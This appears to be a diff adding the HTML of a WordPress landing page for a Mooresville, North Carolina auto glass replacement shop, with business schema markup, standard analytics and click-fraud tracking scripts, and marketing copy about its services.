+  "logo": "https://paige-images-production.s3.amazonaws.com/32f76f43-4a81-4c68-9097-4bc1d7b5fcc1.png",
+  "currenciesAccepted": "USD",
+  "paymentAccepted": "Cash, Credit Card",
+  "address": {
+    "@type": "PostalAddress",
+    "streetAddress": "1892 Charlotte Hwy, Unit 1",
+    "addressLocality": "Mooresville",
+    "addressRegion": "NC",
+    "postalCode": "28115",
+    "addressCountry": "US"
+  },
+  "openingHoursSpecification": [
+    {
+      "@type": "OpeningHoursSpecification",
+      "dayOfWeek": [
+        "MONDAY"
+      ],
+      "opens": "09:00",
+      "closes": "17:00"
+    },
+    {
+      "@type": "OpeningHoursSpecification",
+      "dayOfWeek": [
+        "TUESDAY"
+      ],
+      "opens": "09:00",
+      "closes": "17:00"
+    },
+    {
+      "@type": "OpeningHoursSpecification",
+      "dayOfWeek": [
+        "WEDNESDAY"
+      ],
+      "opens": "09:00",
+      "closes": "17:00"
+    },
+    {
+      "@type": "OpeningHoursSpecification",
+      "dayOfWeek": [
+        "THURSDAY"
+      ],
+      "opens": "09:00",
+      "closes": "17:00"
+    },
+    {
+      "@type": "OpeningHoursSpecification",
+      "dayOfWeek": [
+        "FRIDAY"
+      ],
+      "opens": "09:00",
+      "closes": "17:00"
+    },
+    {
+      "@type": "OpeningHoursSpecification",
+      "dayOfWeek": [
+        "SATURDAY"
+      ],
+      "opens": "09:00",
+      "closes": "11:30"
+    }
+  ],
+  "areaServed": [
+    {
+      "@type": "Place",
+      "name": "Mooresville"
+    },
+    {
+      "@type": "Place",
+      "name": "Troutman"
+    },
+    {
+      "@type": "Place",
+      "name": "Statesville"
+    }
+  ],
+  "sameAs": [
+    "https://www.instagram.com/firstclassautoglassnc/",
+    "https://www.facebook.com/firstclassautoglassnc/",
+    "https://x.com/fcautoglass",
+    "https://www.linkedin.com/company/first-class-auto-glass-nc"
+  ],
+  "aggregateRating": {
+    "@type": "AggregateRating",
+    "ratingValue": "5.0",
+    "reviewCount": 294,
+    "bestRating": 5,
+    "worstRating": 5
+  },
+  "review": [
+    {
+      "@type": "Review",
+      "author": {
+        "@type": "Person",
+        "name": "Emad"
+      },
+      "reviewBody": "",
+      "reviewRating": {
+        "@type": "Rating",
+        "ratingValue": 5
+      }
+    },
+    {
+      "@type": "Review",
+      "author": {
+        "@type": "Person",
+        "name": "Steven Kvasha"
+      },
+      "reviewBody": "Great price on a windshield replacement/repair.",
+      "reviewRating": {
+        "@type": "Rating",
+        "ratingValue": 5
+      }
+    },
+    {
+      "@type": "Review",
+      "author": {
+        "@type": "Person",
+        "name": "Errol Bluefort"
+      },
+      "reviewBody": "Great price on windshield replacement!",
+      "reviewRating": {
+        "@type": "Rating",
+        "ratingValue": 5
+      }
+    },
+    {
+      "@type": "Review",
+      "author": {
+        "@type": "Person",
+        "name": "Fatima"
+      },
+      "reviewBody": "Keith is awesome",
+      "reviewRating": {
+        "@type": "Rating",
+        "ratingValue": 5
+      }
+    },
+    {
+      "@type": "Review",
+      "author": {
+        "@type": "Person",
+        "name": "Wesley Calkins"
+      },
+      "reviewBody": "Awesome job by Keith! Thanks again",
+      "reviewRating": {
+        "@type": "Rating",
+        "ratingValue": 5
+      }
+    }
+  ]
+}
+</script>
+    
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-RLJ67EWN0E"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-RLJ67EWN0E');
+</script>
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-NWPDMTVV');</script>
+<!-- End Google Tag Manager -->
+			<style>
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload) * {
+					background-image: none !important;
+				}
+				@media screen and (max-height: 1024px) {
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+				@media screen and (max-height: 640px) {
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+			</style>
+			<link rel="icon" href="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/cropped-First-Class-Auto-Glass-512x512-1-32x32.jpg" sizes="32x32" />
+<link rel="icon" href="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/cropped-First-Class-Auto-Glass-512x512-1-192x192.jpg" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/cropped-First-Class-Auto-Glass-512x512-1-180x180.jpg" />
+<meta name="msapplication-TileImage" content="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/cropped-First-Class-Auto-Glass-512x512-1-270x270.jpg" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" /></head>
+<body class="wp-singular page-template page-template-elementor_canvas page page-id-2607 wp-embed-responsive wp-theme-hello-elementor hello-elementor-default elementor-default elementor-template-canvas elementor-kit-85 elementor-page elementor-page-2607">
+	            <noscript>
+                <a href="https://www.clickcease.com" rel="nofollow"><img src="https://monitor.clickcease.com/stats/stats.aspx" alt="Clickcease" /></a>
+            </noscript>
+                    <noscript>
+                <iframe src='https://obseu.bmccfortress.com/ns/98fed2db9fdf11d3d32366fe618a6ad8.html?ch=""' width='0' height='0' style='display:none'></iframe>
+            </noscript>
+              <!--  ClickCease.com tracking-->
+      <script type='text/javascript'>var script = document.createElement('script');
+      script.async = true; script.type = 'text/javascript';
+      var target = 'https://www.clickcease.com/monitor/stat.js';
+      script.src = target;var elem = document.head;elem.appendChild(script);
+      </script>
+      <noscript>
+      <a href='https://www.clickcease.com' rel='nofollow'><img src='https://monitor.clickcease.com' alt='ClickCease'/></a>
+      </noscript>
+      <!--  ClickCease.com tracking-->
+
+		<div data-elementor-type="wp-page" data-elementor-id="2607" class="elementor elementor-2607" data-elementor-settings="{&quot;element_pack_global_tooltip_width&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_global_tooltip_width_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_global_tooltip_width_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_global_tooltip_padding&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;element_pack_global_tooltip_padding_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;element_pack_global_tooltip_padding_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;element_pack_global_tooltip_border_radius&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;element_pack_global_tooltip_border_radius_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;element_pack_global_tooltip_border_radius_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true}}" data-elementor-post-type="page">
+				<div class="elementor-element elementor-element-f1bc080 e-flex e-con-boxed e-con e-parent" data-id="f1bc080" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-0b860c5 e-con-full bdt-backdrop-filter-yes e-flex bdt-filter-backdrop e-con e-child" data-id="0b860c5" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-82ec0fb elementor-invisible elementor-widget elementor-widget-ucaddon_side_border_heading" data-id="82ec0fb" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="ucaddon_side_border_heading.default">
+				<div class="elementor-widget-container">
+					
+<!-- start Side Line Heading -->
+<style>/* widget: Side Line Heading */
+
+#uc_side_border_heading_elementor_82ec0fb
+{
+  display:flex;
+}
+
+#uc_side_border_heading_elementor_82ec0fb .side_border_heading_title
+{
+  color:black;
+}
+
+#uc_side_border_heading_elementor_82ec0fb .side_border_heading_subtitle
+{
+  line-height:1.5em;
+  color:gray;
+}
+#uc_side_border_heading_elementor_82ec0fb .side_border_heading_line_holder{
+flex-shrink: 0;
+}
+
+#uc_side_border_heading_elementor_82ec0fb .side_border_heading_line_spacer{
+flex-shrink: 0;
+}
+
+</style>
+
+<div id="uc_side_border_heading_elementor_82ec0fb">
+  <div class="side_border_heading_line_holder"><div class="side_border_heading_line" style="background-color:#45D300;"></div></div>
+  <div class="side_border_heading_line_spacer"></div>
+  <div>
+    <div class="side_border_heading_title"><span  class="uc_style_side_border_heading_elementor_title" style="color:#45D300;">WE COME TO YOU</span></div>
+    <div class="side_border_heading_subtitle"></div>
+  </div>
+</div>
+<!-- end Side Line Heading -->				</div>
+				</div>
+				<div class="elementor-element elementor-element-807da4e elementor-invisible elementor-widget elementor-widget-heading" data-id="807da4e" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h1 class="elementor-heading-title elementor-size-default">Fast &amp; Affordable Auto Glass Replacement</h1>				</div>
+				</div>
+				<div class="elementor-element elementor-element-67f0959 elementor-invisible elementor-widget elementor-widget-text-editor" data-id="67f0959" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Your safety comes first. We replace all types of auto glass — door, back, quarter, and more — using OEM-quality materials, backed by a lifetime warranty. Whether you’re paying with insurance or out of pocket, we make the process simple and stress-free. Call now or request a fast quote online!</p>								</div>
+				</div>
+		<div class="elementor-element elementor-element-7c16b16 e-con-full e-flex e-con e-child" data-id="7c16b16" data-element_type="container" data-e-type="container">
+				<div class="elementor-element elementor-element-afd2769 elementor-invisible elementor-widget elementor-widget-button" data-id="afd2769" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-md" href="#elementor-action%3Aaction%3Dpopup%3Aopen%26settings%3DeyJpZCI6IjIwNDYiLCJ0b2dnbGUiOmZhbHNlfQ%3D%3D">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">GET AN INSTANT QUOTE</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-6fd6d7b elementor-invisible elementor-widget elementor-widget-button" data-id="6fd6d7b" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-md" href="tel:9802428339">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">(980) 242-8339</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				</div>
+				</div>
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-59c0cf3 e-flex e-con-boxed e-con e-parent" data-id="59c0cf3" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-9f9d38c elementor-invisible elementor-widget elementor-widget-ucaddon_side_border_heading" data-id="9f9d38c" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="ucaddon_side_border_heading.default">
+				<div class="elementor-widget-container">
+					
+<!-- start Side Line Heading -->
+<style>/* widget: Side Line Heading */
+
+#uc_side_border_heading_elementor_9f9d38c
+{
+  display:flex;
+}
+
+#uc_side_border_heading_elementor_9f9d38c .side_border_heading_title
+{
+  color:black;
+}
+
+#uc_side_border_heading_elementor_9f9d38c .side_border_heading_subtitle
+{
+  line-height:1.5em;
+  color:gray;
+}
+#uc_side_border_heading_elementor_9f9d38c .side_border_heading_line_holder{
+flex-shrink: 0;
+}
+
+#uc_side_border_heading_elementor_9f9d38c .side_border_heading_line_spacer{
+flex-shrink: 0;
+}
+
+</style>
+
+<div id="uc_side_border_heading_elementor_9f9d38c">
+  <div class="side_border_heading_line_holder"><div class="side_border_heading_line" style="background-color:#168410;"></div></div>
+  <div class="side_border_heading_line_spacer"></div>
+  <div>
+    <div class="side_border_heading_title"><span  class="uc_style_side_border_heading_elementor_title" style="color:#168410;">CERTIFIED EXPERTS. GUARANTEED QUALITY.</span></div>
+    <div class="side_border_heading_subtitle"></div>
+  </div>
+</div>
+<!-- end Side Line Heading -->				</div>
+				</div>
+				<div class="elementor-element elementor-element-6b7754b elementor-invisible elementor-widget elementor-widget-heading" data-id="6b7754b" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Why Choose Us for Your Auto Glass Replacement?</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-7acf6f2 elementor-invisible elementor-widget elementor-widget-text-editor" data-id="7acf6f2" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>For over 15 years, we&#8217;ve helped drivers get back on the road safely with expert auto glass replacements. Whether it&#8217;s side, rear, or quarter glass, our certified techs use OEM-quality glass and precision installation to deliver results you can count on.</p>								</div>
+				</div>
+		<div class="elementor-element elementor-element-9352631 e-con-full e-flex e-con e-child" data-id="9352631" data-element_type="container" data-e-type="container">
+				<div class="elementor-element elementor-element-c82e22d pp-icon-list-traditional elementor-list-item-link-inline pp-icon-left elementor-widget elementor-widget-pp-icon-list" data-id="c82e22d" data-element_type="widget" data-e-type="widget" data-widget_type="pp-icon-list.default">
+				<div class="elementor-widget-container">
+							<div class="pp-list-container">
+			<ul class="pp-list-items">
+																					<li class="pp-icon-list-item elementor-repeater-item-b3680a1">
+										<span class="pp-icon-wrapper">
+										<span class="pp-icon-list-icon pp-icon elementor-animation-grow">
+						<i aria-hidden="true" class="icon icon-van"></i></span>			</span>
+										<span class="pp-icon-list-text">
+								Shop Visit or Mobile Service							</span>
+													</li>
+																											<li class="pp-icon-list-item elementor-repeater-item-28823e4">
+										<span class="pp-icon-wrapper">
+										<span class="pp-icon-list-icon pp-icon elementor-animation-grow">
+						<svg aria-hidden="true" class="e-font-icon-svg e-fas-file-invoice-dollar" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M377 105L279.1 7c-4.5-4.5-10.6-7-17-7H256v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-153 31V0H24C10.7 0 0 10.7 0 24v464c0 13.3 10.7 24 24 24h336c13.3 0 24-10.7 24-24V160H248c-13.2 0-24-10.8-24-24zM64 72c0-4.42 3.58-8 8-8h80c4.42 0 8 3.58 8 8v16c0 4.42-3.58 8-8 8H72c-4.42 0-8-3.58-8-8V72zm0 80v-16c0-4.42 3.58-8 8-8h80c4.42 0 8 3.58 8 8v16c0 4.42-3.58 8-8 8H72c-4.42 0-8-3.58-8-8zm144 263.88V440c0 4.42-3.58 8-8 8h-16c-4.42 0-8-3.58-8-8v-24.29c-11.29-.58-22.27-4.52-31.37-11.35-3.9-2.93-4.1-8.77-.57-12.14l11.75-11.21c2.77-2.64 6.89-2.76 10.13-.73 3.87 2.42 8.26 3.72 12.82 3.72h28.11c6.5 0 11.8-5.92 11.8-13.19 0-5.95-3.61-11.19-8.77-12.73l-45-13.5c-18.59-5.58-31.58-23.42-31.58-43.39 0-24.52 19.05-44.44 42.67-45.07V232c0-4.42 3.58-8 8-8h16c4.42 0 8 3.58 8 8v24.29c11.29.58 22.27 4.51 31.37 11.35 3.9 2.93 4.1 8.77.57 12.14l-11.75 11.21c-2.77 2.64-6.89 2.76-10.13.73-3.87-2.43-8.26-3.72-12.82-3.72h-28.11c-6.5 0-11.8 5.92-11.8 13.19 0 5.95 3.61 11.19 8.77 12.73l45 13.5c18.59 5.58 31.58 23.42 31.58 43.39 0 24.53-19.05 44.44-42.67 45.07z"></path></svg></span>			</span>
+										<span class="pp-icon-list-text">
+								Upfront &amp; Transparent Pricing							</span>
+													</li>
+													</ul>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-34ff35c pp-icon-list-traditional elementor-list-item-link-inline pp-icon-left elementor-widget elementor-widget-pp-icon-list" data-id="34ff35c" data-element_type="widget" data-e-type="widget" data-widget_type="pp-icon-list.default">
+				<div class="elementor-widget-container">
+							<div class="pp-list-container">
+			<ul class="pp-list-items">
+																					<li class="pp-icon-list-item elementor-repeater-item-b3680a1">
+										<span class="pp-icon-wrapper">
+										<span class="pp-icon-list-icon pp-icon elementor-animation-grow">
+						<i aria-hidden="true" class="material-icons md-high_quality" data-md-icon="high_quality"></i></span>			</span>
+										<span class="pp-icon-list-text">
+								OEM-Quality Glass							</span>
+													</li>
+																											<li class="pp-icon-list-item elementor-repeater-item-28823e4">
+										<span class="pp-icon-wrapper">
+										<span class="pp-icon-list-icon pp-icon elementor-animation-grow">
+						<i aria-hidden="true" class="icon icon-shield"></i></span>			</span>
+										<span class="pp-icon-list-text">
+								Lifetime Warranty							</span>
+													</li>
+													</ul>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-d18aa72 pp-icon-list-traditional elementor-list-item-link-inline pp-icon-left elementor-widget elementor-widget-pp-icon-list" data-id="d18aa72" data-element_type="widget" data-e-type="widget" data-widget_type="pp-icon-list.default">
+				<div class="elementor-widget-container">
+							<div class="pp-list-container">
+			<ul class="pp-list-items">
+																					<li class="pp-icon-list-item elementor-repeater-item-b3680a1">
+										<span class="pp-icon-wrapper">
+										<span class="pp-icon-list-icon pp-icon elementor-animation-grow">
+						<svg aria-hidden="true" class="e-font-icon-svg e-fas-medal" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M223.75 130.75L154.62 15.54A31.997 31.997 0 0 0 127.18 0H16.03C3.08 0-4.5 14.57 2.92 25.18l111.27 158.96c29.72-27.77 67.52-46.83 109.56-53.39zM495.97 0H384.82c-11.24 0-21.66 5.9-27.44 15.54l-69.13 115.21c42.04 6.56 79.84 25.62 109.56 53.38L509.08 25.18C516.5 14.57 508.92 0 495.97 0zM256 160c-97.2 0-176 78.8-176 176s78.8 176 176 176 176-78.8 176-176-78.8-176-176-176zm92.52 157.26l-37.93 36.96 8.97 52.22c1.6 9.36-8.26 16.51-16.65 12.09L256 393.88l-46.9 24.65c-8.4 4.45-18.25-2.74-16.65-12.09l8.97-52.22-37.93-36.96c-6.82-6.64-3.05-18.23 6.35-19.59l52.43-7.64 23.43-47.52c2.11-4.28 6.19-6.39 10.28-6.39 4.11 0 8.22 2.14 10.33 6.39l23.43 47.52 52.43 7.64c9.4 1.36 13.17 12.95 6.35 19.59z"></path></svg></span>			</span>
+										<span class="pp-icon-list-text">
+								Certified Technicians 							</span>
+													</li>
+																											<li class="pp-icon-list-item elementor-repeater-item-28823e4">
+										<span class="pp-icon-wrapper">
+										<span class="pp-icon-list-icon pp-icon elementor-animation-grow">
+						<svg xmlns="http://www.w3.org/2000/svg" id="Layer_1" data-name="Layer 1" viewBox="0 0 393.5 490"><defs><style>      .cls-1 {        fill-rule: evenodd;        stroke-width: 0px;      }    </style></defs><path class="cls-1" d="M95.61,162.1c-.2.08-.4.17-.59.25-5.86,2.65-10.37,7.37-14.14,13.31-.51.81-.78,1.74-.78,2.69v12.25c0,1.65.82,3.19,2.18,4.12,1.36.93,3.1,1.13,4.64.53,2.79-1.08,5.63-2,8.53-2.74-1.84,141.78.17,237.83,9.53,267.82.33,1.04.98,1.95,1.88,2.58,25.18,17.9,55.02,25.55,89.67,27.09h.44c34.65-1.54,64.49-9.19,89.67-27.09.9-.63,1.55-1.54,1.88-2.58,9.37-30.01,11.37-126.13,9.52-268.01,3.17.77,6.27,1.75,9.3,2.93,1.54.6,3.28.4,4.64-.53,1.36-.93,2.18-2.47,2.18-4.12v-12.25c0-.95-.27-1.88-.78-2.69-3.77-5.94-8.28-10.66-14.14-13.31-.44-.2-.89-.39-1.36-.56-.46-31.91-1.1-57.43-1.88-93.1-.01-.41-.07-.82-.18-1.21-6.62-24.11-17.96-40.97-34.39-51.87C245.21,4.86,223.89-.09,196.75,0c-27.14-.09-48.46,4.86-64.68,15.61-16.43,10.9-27.77,27.76-34.39,51.87-.11.39-.17.8-.17,1.21-.79,35.79-1.44,61.36-1.9,93.41ZM135.94,437.94l-6.31,8.04c-1.12,1.43-2.94,2.14-4.74,1.84l-13.07-2.16c.68,3.87,1.43,7.23,2.23,10.08,23.32,16.07,50.88,22.82,82.7,24.26,31.83-1.44,59.38-8.19,82.7-24.26.8-2.85,1.55-6.22,2.23-10.08l-13.07,2.16c-1.8.3-3.62-.41-4.74-1.84l-6.31-8.04c-13.07,13.29-31.49,20.23-60.79,20.1-29.33.14-47.76-6.81-60.83-20.1ZM142.18,430c11.54,12.25,28.08,18.16,54.55,18.04h.04c26.47.12,43.01-5.79,54.55-18.04l-1.9-2.41h-105.34l-1.9,2.41ZM287.86,160.03c-.46-30.81-1.09-55.89-1.85-90.5-5.89-21.07-15.66-36-30.11-45.59-14.8-9.81-34.35-14.02-59.13-13.94h-.04c-24.78-.08-44.33,4.13-59.13,13.94-14.45,9.59-24.22,24.52-30.11,45.59-.76,34.61-1.39,59.69-1.85,90.51,1.89-.03,3.88.1,6.01.42.03-.83.06-1.66.1-2.5.1-2.52,2.07-4.57,4.58-4.78,2.52-.21,4.79,1.49,5.31,3.96,16.55,79.73,18.46,165.72,21.43,240.85.04.97-.2,1.93-.7,2.77l-8.01,13.33c-1.09,1.82-3.2,2.75-5.28,2.33-2.07-.42-3.66-2.1-3.95-4.2-11.14-78.82-15.4-152.38-14.3-221.84-1.8.05-3.59.17-5.35.35-1.54,116.02-.72,201.3,4.78,244.54l13.34,2.2,14.12-17.97c.95-1.21,2.4-1.91,3.93-1.91h110.2c1.53,0,2.98.7,3.93,1.91l14.12,17.97,13.34-2.2c5.5-43.25,6.32-128.57,4.78-244.62-1.76-.16-3.55-.26-5.35-.29,1.1,69.46-3.16,143.03-14.3,221.86-.29,2.1-1.88,3.78-3.95,4.2-2.08.42-4.19-.51-5.28-2.33l-8.01-13.33c-.48-.82-.73-1.75-.71-2.7,1.88-75.15,3.91-161.21,21.45-240.97.54-2.46,2.82-4.13,5.33-3.91,2.5.22,4.45,2.27,4.55,4.78.04.88.07,1.75.11,2.63,2.12-.37,4.11-.54,6-.56ZM260.48,396.12l12.35-188.12c-9.27,63.76-10.89,129.25-12.35,188.12ZM132.98,395.74l-12.32-184.18c0,58.25,3.82,119.43,12.32,184.18ZM353.81,188.05c17.95,12.57,29.69,33.4,29.69,56.95s-11.74,44.38-29.69,56.95c-2.26,1.58-2.81,4.7-1.22,6.96,1.58,2.26,4.7,2.81,6.96,1.23,20.52-14.38,33.95-38.2,33.95-65.14s-13.43-50.76-33.95-65.14c-2.26-1.58-5.38-1.03-6.96,1.23-1.59,2.26-1.04,5.38,1.22,6.96ZM33.95,179.86C13.43,194.24,0,218.06,0,245s13.43,50.76,33.95,65.14c2.26,1.58,5.38,1.03,6.96-1.23,1.59-2.26,1.04-5.38-1.22-6.96-17.95-12.57-29.69-33.4-29.69-56.95s11.74-44.38,29.69-56.95c2.26-1.58,2.81-4.7,1.22-6.96-1.58-2.26-4.7-2.81-6.96-1.23ZM162.06,298.54h69.38c10.37,0,18.78-8.41,18.78-18.77v-27.55c0-10.36-8.41-18.78-18.78-18.78h-69.38c-10.37,0-18.78,8.42-18.78,18.78v27.55c0,10.36,8.41,18.77,18.78,18.77ZM339.1,209.1c11.31,7.93,18.72,21.05,18.72,35.9s-7.41,27.98-18.72,35.9c-2.26,1.58-2.81,4.7-1.22,6.96,1.58,2.26,4.7,2.81,6.96,1.23,13.89-9.73,22.98-25.86,22.98-44.09s-9.09-34.36-22.98-44.09c-2.26-1.58-5.38-1.03-6.96,1.23-1.59,2.26-1.04,5.38,1.22,6.96ZM48.66,200.91c-13.89,9.73-22.98,25.86-22.98,44.09s9.09,34.36,22.98,44.09c2.26,1.58,5.38,1.03,6.96-1.23,1.59-2.26,1.04-5.38-1.22-6.96-11.31-7.92-18.72-21.05-18.72-35.9s7.41-27.97,18.72-35.9c2.26-1.58,2.81-4.7,1.22-6.96-1.58-2.26-4.7-2.81-6.96-1.23ZM231.44,288.54h-69.38c-4.85,0-8.78-3.93-8.78-8.77v-27.55c0-4.84,3.93-8.78,8.78-8.78h69.38c4.85,0,8.78,3.94,8.78,8.78v27.55c0,4.84-3.93,8.77-8.78,8.77ZM62.63,220.91c-7.59,5.32-12.55,14.13-12.55,24.09s4.96,18.78,12.55,24.09c2.26,1.58,5.38,1.04,6.97-1.22,1.58-2.26,1.03-5.38-1.23-6.97-5.01-3.51-8.29-9.32-8.29-15.9s3.28-12.39,8.29-15.9c2.26-1.58,2.81-4.71,1.23-6.97-1.59-2.26-4.71-2.8-6.97-1.22ZM325.13,229.1c5.01,3.51,8.29,9.32,8.29,15.9s-3.28,12.39-8.29,15.9c-2.26,1.59-2.81,4.71-1.23,6.97,1.59,2.26,4.71,2.8,6.97,1.22,7.59-5.31,12.55-14.13,12.55-24.09s-4.96-18.77-12.55-24.09c-2.26-1.58-5.38-1.04-6.97,1.22-1.58,2.26-1.03,5.39,1.23,6.97ZM196.66,204.81h.18c23.54-.42,42.34,2.29,57.9,7.2,1.39.44,2.9.25,4.14-.52s2.08-2.04,2.3-3.48l11.16-71.89c.21-1.39-.17-2.8-1.05-3.9-12.08-15-36.9-23.38-74.43-24.17h-.22c-37.53.79-62.35,9.17-74.43,24.17-.88,1.1-1.26,2.51-1.05,3.9l11.16,71.89c.22,1.44,1.06,2.71,2.3,3.48s2.75.96,4.14.52c15.56-4.91,34.36-7.62,57.9-7.2ZM196.75,194.81c-22.05-.39-40.16,1.88-55.43,6.03l-9.92-63.97c11.26-12.27,33.26-18.13,65.34-18.82,32.1.69,54.1,6.55,65.36,18.82l-9.92,63.97c-15.27-4.15-33.38-6.42-55.44-6.03h.01ZM282.47,180.36c7.56.09,14.77,1.22,21.69,3.25v-3.78c-2.48-3.66-5.3-6.68-9.03-8.36-3.47-1.57-7.66-1.89-12.92-.77.1,3.21.18,6.43.26,9.66ZM111.3,170.55c-4.91-.94-8.87-.57-12.17.92-3.73,1.68-6.55,4.7-9.03,8.36v3.78c6.69-1.96,13.65-3.09,20.93-3.24.08-3.28.17-6.56.27-9.82Z"></path></svg></span>			</span>
+										<span class="pp-icon-list-text">
+								ADAS Recalibration							</span>
+													</li>
+													</ul>
+		</div>
+						</div>
+				</div>
+				</div>
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-37ccf3b pa-display-conditions-yes e-flex e-con-boxed e-con e-parent" data-id="37ccf3b" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;pa_display_conditions_switcher&quot;:&quot;yes&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-056150e e-con-full pa-display-conditions-yes elementor-hidden-mobile e-flex e-con e-child" data-id="056150e" data-element_type="container" data-e-type="container" data-settings="{&quot;pa_display_conditions_switcher&quot;:&quot;yes&quot;}">
+				<div class="elementor-element elementor-element-69336af premium-carousel-ripple-yes pa-carousel-template pa-carousel-horizontal elementor-invisible elementor-widget elementor-widget-premium-carousel-widget" data-id="69336af" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInRight&quot;}" data-widget_type="premium-carousel-widget.default">
+				<div class="elementor-widget-container">
